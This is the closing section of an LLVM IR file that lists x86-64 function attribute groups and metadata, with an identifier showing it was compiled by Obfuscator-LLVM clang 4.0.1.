attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146616014}
!2 = !{i32 -2146615323}
!3 = !{i32 -2146614574}
!4 = !{i32 -2146613751}
!5 = !{i32 -2146612931}
!6 = !{i32 -2146611527}
!7 = !{i32 -2146610665}
!8 = !{i32 -2146609944}
